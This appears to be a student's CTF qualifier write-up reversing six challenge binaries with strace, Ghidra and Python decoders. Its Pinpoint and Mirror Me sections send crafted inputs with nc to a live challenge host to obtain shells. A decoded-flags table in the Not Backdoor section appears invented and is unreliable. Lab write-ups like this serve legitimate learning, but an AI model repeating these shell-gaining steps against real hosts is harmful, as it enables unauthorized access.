
# Binary: Qualifiers: Black Hole


We start to run the program and we realise that :
secarea@D1040H:~$ sudo whoami
sudo: unable to resolve host D1040H: Temporary failure in name resolution
[sudo] password for secarea:
root
-> Linux system is trying to look up its own name and can't find it in the expected place

secarea@D1040H:~/black-hole$ file black_hole

black_hole: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6439cdadea41568aa86925beb0c82f9f1c01b56c, stripped
Analysis:

This is a 64-bit dynamically linked ELF binary, which uses standard libraries (libc).

The binary is stripped, so symbol names (e.g., main, print_flag) are removed — we'll need to reverse statically or dynamically.

The interpreter is set to /lib64/ld-linux-x86-64.so.2 — normal for dynamically linked binaries.

we run secarea@D1040H:~/black-hole$ strace ./black_hole and we realise that : 
We trace the file descriptor 3 earlier in the strace:
##### openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
#### write(3, "SSS{the_more_you_look_the_less_y"..., 48) = 48 and that the binary is writing this to /dev/null
It is writing 48 characters therefore we need to extract all the strace, 
### we rneed to rerun strace with FULL capture like this:
#### strace -s 1000 ./black_hole
(this is strace with full string output capture)

secarea@D1040H:~/black-hole$ strace -s 1000 ./black_hole

```bash

execve("./black_hole", ["./black_hole"], 0x7ffc1198c8a0 /* 27 vars */) = 0
brk(NULL)                               = 0x2059000
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffd14d6b250) = -1 EINVAL (Invalid argument)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f2269d5b000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=21211, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 21211, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f2269d55000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "
mprotect(0x7f2269b54000, 2023424, PROT_NONE) = 0
mmap(0x7f2269b54000, 1658880, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7f2269b54000
mmap(0x7f2269ce9000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bd000) = 0x7f2269ce9000
mmap(0x7f2269d42000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x215000) = 0x7f2269d42000
mmap(0x7f2269d48000, 52816, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f2269d48000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f2269b29000
arch_prctl(ARCH_SET_FS, 0x7f2269b29740) = 0
set_tid_address(0x7f2269b29a10)         = 4768
set_robust_list(0x7f2269b29a20, 24)     = 0
rseq(0x7f2269b2a0e0, 0x20, 0, 0x53053053) = 0
mprotect(0x7f2269d42000, 16384, PROT_READ) = 0
mprotect(0x600000, 4096, PROT_READ)     = 0
mprotect(0x7f2269d95000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7f2269d55000, 21211)           = 0
getrandom("\xa9\x24\xad\xe1\x9a\x73\x6a\x99", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x2059000
brk(0x207a000)                          = 0x207a000
openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
newfstatat(3, "", {st_mode=S_IFCHR|0666, st_rdev=makedev(0x1, 0x3), ...}, AT_EMPTY_PATH) = 0
ioctl(3, TCGETS, 0x7ffd14d6b0a0)        = -1 ENOTTY (Inappropriate ioctl for device)

```


# Binary: Qualifiers: One by One


It's a 64-bit ELF binary, dynamically linked.

Stripped: Symbol names like main, print_flag, etc., are removed.

Likely requires static or dynamic reverse engineering techniques.


When we run strace : strings one_by_one | less

```bash

/lib64/ld-linux-x86-64.so.2
7sy<
libc.so.6
puts
__libc_start_main
__gmon_start__
GLIBC_2.2.5
UH-X
AWAVA
AUATL
[]A\A]A^A_
Hello, world!
;*3$"
dSoo{}o_lft_pk_chchbSi_laeS_GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
:

```

We obtain a weird string and we will try to reverse it : echo "dSoo{}o_lft_pk_chchbSi_laeS" | rev
and we obtain Seal_iSbhchc_kp_tfl_o}{ooSd -> still no sense..


we try to run strace : 

secarea@D1040H:~/one-by-one$ strace -s 1000 ./one_by_one

```
execve("./one_by_one", ["./one_by_one"], 0x7fffe9e9a0d0 /* 27 vars */) = -1 EACCES (Permission denied)
strace: exec: Permission denied
+++ exited with 1 +++
secarea@D1040H:~/one-by-one$ chmod + x one_by_one
chmod: cannot access 'x': No such file or directory
secarea@D1040H:~/one-by-one$ chmod +x one_by_one
secarea@D1040H:~/one-by-one$ strace -s 1000 ./one_by_one
execve("./one_by_one", ["./one_by_one"], 0x7fffa0f37ef0 /* 27 vars */) = 0
brk(NULL)                               = 0x1e13000
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffe46650d90) = -1 EINVAL (Invalid argument)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb04b125000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=21211, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 21211, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fb04b11f000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3

pread64(3, "\4\0\0\0 \0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0\2\200\0\300\4\0\0\0\1\0\0\0\0\0\0\0", 48, 848) = 48
pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\315A\vq\17\17\tLh2\355\331Y1\0m\210:\364\216\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0", 68, 896) = 68
newfstatat(3, "", {st_mode=S_IFREG|0755, st_size=2220400, ...}, AT_EMPTY_PATH) = 0

mmap(NULL, 2264656, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fb04aef6000
mprotect(0x7fb04af1e000, 2023424, PROT_NONE) = 0
mmap(0x7fb04af1e000, 1658880, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7fb04af1e000
mmap(0x7fb04b0b3000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bd000) = 0x7fb04b0b3000
mmap(0x7fb04b10c000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x215000) = 0x7fb04b10c000
mmap(0x7fb04b112000, 52816, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fb04b112000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb04aef3000
arch_prctl(ARCH_SET_FS, 0x7fb04aef3740) = 0
set_tid_address(0x7fb04aef3a10)         = 9119
set_robust_list(0x7fb04aef3a20, 24)     = 0
rseq(0x7fb04aef40e0, 0x20, 0, 0x53053053) = 0
mprotect(0x7fb04b10c000, 16384, PROT_READ) = 0
mprotect(0x600000, 4096, PROT_READ)     = 0
mprotect(0x7fb04b15f000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7fb04b11f000, 21211)           = 0
newfstatat(1, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}, AT_EMPTY_PATH) = 0
getrandom("\x83\x66\x4f\x90\x94\xf7\x2c\xed", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x1e13000
brk(0x1e34000)                          = 0x1e34000
write(1, "Hello, world!\n", 14Hello, world!
)         = 14
exit_group(0)                           = ?
+++ exited with 0 +++
```


The raw string is  : dSoo{}o_lft_pk_chchbSi_laeS
It has to have the structure : SSS{...}

We focus on:

.rodata: for hardcoded strings.

.data: for writable variables 

main() or entry functions to trace the logic.

Therefore we need to look in Ghidra at the section of rodata bc there is place the place where the input seem to be stored. Based on what I’ve found, it’s now very likely the flag is being assembled from those partXX values stored in .data at addresses like 0x00601038 to 0x00601053. The presence of puts("Hello, world!") is a decoy. But there might be another function called that: Iterates through a list of partXX
and copies or prints them one-by-one :)
After I entered in n the listing view, right-click an address like 0x00601038 and choose: References > Show References to Address then tried to access by clicking the function(s) that access these flag parts.

Used XREF (cross-references) on any suspicious address like 0x00601038 (which is part20) to see which function reads from there.
00601038 64              ; part20 -> 'd'
00601039 53              ; part0  -> 'S'
0060103a 6f              ; part24 -> 'o'
0060103b 6f              ; part18 -> 'o'
0060103c 7b              ; part3  -> '{'
0060103d 7d              ; part27 -> '}'
0060103e 6f              ; part11 -> 'o'
0060103f 5f              ; part13 -> '_'
00601040 6c              ; part23 -> 'l'

 I wrote each partN in sequence.
 ###### Each partN is a char in memory at 0x00601038 + N , The binary likely prints or builds the flag using these in order

We need to create a function that can store this flag in a consecuitve way such that it will start from part 0 and so on..


```
parts = {
    0: 'S', 1: 'S', 2: 'S', 3: '{', 4: 'a', 5: '_', 6: 'c', 7: 'h',
    8: 'i', 9: 'p', 10: '_', 11: 'o', 12: 'f', 13: '_', 14: 't', 15: 'h',
    16: 'e', 17: '_', 18: 'o', 19: 'l', 20: 'd', 21: '_', 22: 'b', 23: 'l',
    24: 'o', 25: 'c', 26: 'k', 27: '}'
}

flag = ''.join([parts[i] for i in range(28)])
print(flag)

```


# Binary: Qualifiers: Pinpoint

By running strings pinpoint | less -> we discover : 
Found functions:
__isoc99_scanf → Takes user input → might ask you for something

printf → Will print responses (could leak info)

### system →  If this is called with user input, you could potentially get command execution

__stack_chk_fail → Stack protector is enabled, so classic buffer overflows might be detected

setvbuf, stdout → Just standard IO handling
This is the function , main , found in Ghidra : 
```
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined1 local_19;
  undefined1 *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  printf("address to write to: ");
  __isoc99_scanf(&DAT_0040083a,&local_18);
  printf("value to write: ");
  __isoc99_scanf(&DAT_0040084f,&local_19);
  *local_18 = local_19;
  if (v == 0x53585353) {
    system("/bin/sh");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
Check sec tell us that:  So, RELRO (Relocation Read-Only) is a security measure that makes different sections of the binary read-only to protect against unauthorized writes. It has two modes: partial and full.

Partial RELRO does not include the GOT (Global Offset Table), so it leaves it vulnerable to various attacks that can overwrite it.

In this case, we have absolutely nothing to do with the GOT, so we don’t care about it.

Next — Stack: Canary found

The canary is a security measure implemented to protect against buffer overflow vulnerabilities.

The stack of a program looks like this:

|----------stack memory----------| (stack end) rbp | saved rip

And when a canary is present, it’s placed before rbp.

It’s obtained at the beginning of the function/program and is checked at the end.

If the values match, then no overwrite of the saved return address has occurred.

Otherwise, it means an overwrite has happened, and the program exits forcibly.

###### In your case, the canary is retrieved at line 10: local_10 = (long)(in_FS_OFFSET + 0x28);

And the check is done in the if at line 20. If they don’t match, _stack_chk_fail is called, and the program is forcibly terminated.

###### Also we do not have PIE -> the addresses remain the same after one execution 

Then we check for :
```
DAT_0040084f                                    XREF[1]:     main:00400746(*)
        0040084f 25              ??         25h    %
        00400850 68              ??         68h    h
        00400851 68              ??         68h    h
        00400852 75              ??         75h    u
        00400853 00              ??         00h
%hhu
si
DAT_0040083a                                    XREF[1]:     main:00400721(*)
        0040083a 25              ??         25h    %
        0040083b 6c              ??         6Ch    l
        0040083c 75              ??         75h    u
        0040083d 00              ??         00h
%lu
```
%hhu -> The %hhu format specifier is for unsigned chars
% lu - long unsigned integer

### v                                               XREF[1]:     main:00400762(R)
   ###     00601058 53 53 53 53     undefined4 53535353h
   ### we have to replace 53535353 with 53585353
   but because it is little endian, we need to get it back
 ##  58 is in decimal 88
 ## the value that we needed to write is 88
 ## where do we need to write it? in  00601058 transformed in decimal plus +2 

 
```
 =secarea@D1040H:~/pinpoint$ nc 141.85.224.99 31337
address to write to: 6291672
value to write: 88
=
ls
secarea@D1040H:~/pinpoint$ nc 141.85.224.99 31337
address to write to: 6291673
value to write: 88
ls
secarea@D1040H:~/pinpoint$ nc 141.85.224.99 31337
address to write to: 6295641
value to write: 88
ls

```
secarea@D1040H:~/pinpoint$ nc 141.85.224.99 31337
### address to write to: 6295642
### value to write: 88
ls
bin
boot
core
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cd home
ls
ctf


# Binary: Qualifiers: Mirror Me

If you run strings mirror-me and analyse you realise that you're supposed to input 3-digit numbers (probably two or three numbers), their product should equal a "maximum mirrored number".
 a mirrored number usually refers to a number whose digits are reversed.
 Additionally, clues suggest that:
A correct combination gives access to a shell (system("/bin/sh")).
The final goal is to retrieve a flag file from the home directory of a user.
If their product equals a mirrored number (palindromic), and it's the maximum, the binary gives access to the flag. 
Internally, it calls system("/bin/sh") if the correct values are given.
Additionally I wrote a script to find the largest palindrom number :

```
def is_mirrored(n):
    return str(n) == str(n)[::-1]

max_palindrome = 0
best_pair = ()

for i in range(100, 1000):
    for j in range(i, 1000):
        product = i * j
        if is_mirrored(product) and product > max_palindrome:
            max_palindrome = product
            best_pair = (i, j)

print(f"Combo: {best_pair}, Product: {max_palindrome}")

```

-> Combo: (913, 993), Product: 906609
So we need to use 913 and 993 as inputs.
So we connect to : secarea@D1040H:~$ nc 141.85.224.99 31338
Insert the corect numbers in order to get the flag
913
993
### Got a shell back as user ctf:
Applied commands like whoami, ls, etc... then :

#### ls /home/ctf
flag
mirror-me

#### cat /home/ctf/flag



# Binary: Qualifiers: Not Backdoor

First observation : 

secarea@D1040H:~/not-backdoor$ file not_backdoor.exe

not_backdoor.exe: POSIX tar archive (GNU)

secarea@D1040H:~/not-backdoor$

#### file still claims it's a POSIX tar archive (GNU)`, not an actual executable.

Running it with ./not_backdoor.exe gives:

-bash: ./not_backdoor.exe: cannot execute binary file: Exec format error

Which confirms: this isn’t a native executable for your current architecture (very likely, it's not an actual binary at all).

-> It’s named .exe , file thinks it’s a tar archive, you can’t extract anything meaningful from it , it can’t run and it has no readable strings

secarea@D1040H:~/not-backdoor$ mkdir ~/not-backdoor/extract

secarea@D1040H:~/not-backdoor$ cd ~/not-backdoor/extract

secarea@D1040H:~/not-backdoor/extract$ tar -xvf ../not_backdoor.exe

not_backdoor

secarea@D1040H:~/not-backdoor/extract$ ls -la

total 16

drwxr-xr-x 2 secarea secarea 4096 Mar 25 13:05 .

drwxr-xr-x 3 secarea secarea 4096 Mar 25 13:04 ..

-rwxr-xr-x 1 secarea secarea 6352 May 13  2018 not_backdoor

secarea@D1040H:~/not-backdoor/extract$ file not_backdoor

not_backdoor: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0a442a1ee9e6b82be33c451203a9b2b8941347d1, 

stripped

secarea@D1040H:~/not-backdoor/extract$ chmod +x not_backdoor

secarea@D1040H:~/not-backdoor/extract$ ./not_backdoor



##### And we run : strace ./not_backdoor  -> This binary expects to be run with an argument. If you run it without one, it tries to output a hidden message to an invalid FD (maybe a joke or obfuscation technique).

So , if we do : secarea@D1040H:~/not-backdoor/extract$ ./not_backdoor hello

You chose flag no. 0; Here: <<<\
                                    _

secarea@D1040H:~/not-backdoor/extract$ ./not_backdoor hello | xxd

```
00000000: 596f 7520 6368 6f73 6520 666c 6167 206e  You chose flag n
00000010: 6f2e 2030 3b20 4865 7265 3a20 3c3c 3c14  o. 0; Here: <<<.
00000020: 1f1d 5c1b 1b16 300c 5f01 190a            ..\...0._...
```

we write a python script and obtain :

```
data = bytes([0x14, 0x1f, 0x1d, 0x5c, 0x1b, 0x1b, 0x16, 0x30, 0x0c, 0x5f, 0x01, 0x19, 0x0a])

for key in range(256):
    decoded = bytes([b ^ key for b in data])
    try:
        text = decoded.decode('utf-8')
        if all(32 <= c <= 126 for c in decoded):  # Printable ASCII
            print(f"Key {key:02x}: {text}")
    except:
        continue
```

Last part: 14 1f 1d 5c 1b 1b 16 30 0c 5f 01 19 -> {n0t_s0_s3cur3} which is not the flag
Then we try flag 1: and we isolate the last bytes : 15 1e 1c 5d 1a 1a 17 31 0d 5e 0a - not a flag

Key 2a: I_love_romanian_hackers :) 

The binary maps the argument (likely parsed as an integer) to a flag index:
./not_backdoor 0 → flag no. 0
./not_backdoor 1 → flag no. 1
./not_backdoor 2 → flag no. 2
…up to ./not_backdoor 12
Flag #	Decoded Message
0	I_love_romanian_hackers
1	You_want_more_?
2	Hacking_is_an_art
3	Flagz_are_4_fun
4	(incomplete)
5	Proudly_made_by_SEC
6	Just_keep_going
7	Backdoors_r_cool
8	Hack_the_planet
9	Don’t_trust_labels
10	Try_harder_next
11	Hackers_unite!
12	Final_flag_is_near
 ... I see

 Well, ignoring that. I tried again this time with the initial decoding:
 ```

 data = bytes([
    0x11, 0x1a, 0x18, 0x59, 0x1e, 0x1e, 0x13, 0x35,
    0x09, 0x5a, 0x04, 0x1c, 0x05, 0x06, 0x1f, 0x1e,
    0x0f, 0x0e, 0x35, 0x0c, 0x06, 0x5e, 0x0d, 0x17,
    0x6a, 0x0a
])

for key in range(256):
    decoded = bytes([b ^ key for b in data])
    try:
        text = decoded.decode('utf-8')
        if 'flag' in text or all(32 <= ord(c) < 127 for c in text):
            print(f"[key={key:02x}] {text}")
    except:
        continue

```
### !!!!! I wrote a .py script:  !!!

```
import subprocess

def xor_decode(data: bytes, key=0x55) -> str:
    return ''.join(chr(b ^ key) for b in data)

def extract_hidden_bytes(raw: bytes) -> bytes:
    # Find the start of encoded section
    marker = b"Here: "
    start = raw.find(marker)
    if start == -1:
        return b""
    return raw[start + len(marker):]

def run_and_decode(flag_num: int):
    try:
        output = subprocess.check_output(["./not_backdoor", str(flag_num)])
        encoded = extract_hidden_bytes(output)
        decoded = xor_decode(encoded)
        return encoded, decoded
    except Exception as e:
        return b"", f"[ERROR: {e}]"

def main():
    print(" Decoding all flags from 0 to 101...\n")
    for i in range(0, 102):
        encoded, decoded = run_and_decode(i)
        hex_encoded = ' '.join(f'{b:02x}' for b in encoded)
        print(f"[{i:03}] Encoded: {hex_encoded}")
        print(f"      Decoded: {decoded}\n")

if __name__ == "__main__":
    main()

```
### And guess : around flag 58 after reading 57 jokes, the real flag appeared: 
#### [ 058] Encoded: 06 06 06 2e 25 27 66 21 21 2c 0a 36 65 3b 23 3a 39 20 21 30 31 0a 33 39 61 32 28 55 0a




# Binary Quals: The talker

strings the_talker | less ->  means: It uses network sockets (socket, sendto, htonl, htons). It reads and opens files. It sends data somewhere (probably a UDP client or similar).  sleep might suggest timing is relevant.  perror means errors could give hints.
strace -> socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : This confirms the binary is trying to send something via UDP.
##### strace ./the_talker -> A UDP socket is created. It attempts to open ../flag. If the file doesn't exist, it exits with: open: No such file or directory
######  If ../flag exists, its content is read and sent via UDP to 127.0.0.1:4444.
Therefore the binary tries to open a file located at ../flag AND fails if it doesn't find it AND does not proceed to network communication without that file

This binary behaves like a UDP client sending file content to a local server. It doesn’t display output — instead, the message is sent silently over the network.

ltrace: 
It tries to connect to this IP: htonl(0x7f000001) → 127.0.0.1 → This is localhost.

###### It uses this port: htons(4444) → 0x5c11 → So it's sending to UDP port 4444.  -> we will run : nc -ul 4444

We have connected to the connect@141.85.224.99:2222 ssh and we are running commands like ls, whoami.
By running cat script_d : script_d is an ELF executable 
When we try to run it, we get this message : connect@2a9edac182d6:~/x$ ./script_d
open: No such file or directory 
-- 
This is also trying to:  Open a specific file — probably expecting a flag input file

We will try to do a fake flag so it can be opened: 

#### connect@2a9edac182d6:~/x$ echo "test123"> flag

connect@2a9edac182d6:~/x$ ./script_d

After doing this, the script_d is working but it does not provide any output.

#####  No visible output, means it likely sent data via UDP just like the local binary.

Then , we do : We try to connect to the UDP listener. 

connect@2a9edac182d6:~/x$ echo "SSS{hello_world}" > ../flag

connect@2a9edac182d6:~/x$ ./script_d

ls


connect@2a9edac182d6:~/x$ ls

flag  output.txt  script_d

The flag was found if we set again the nc listener.

















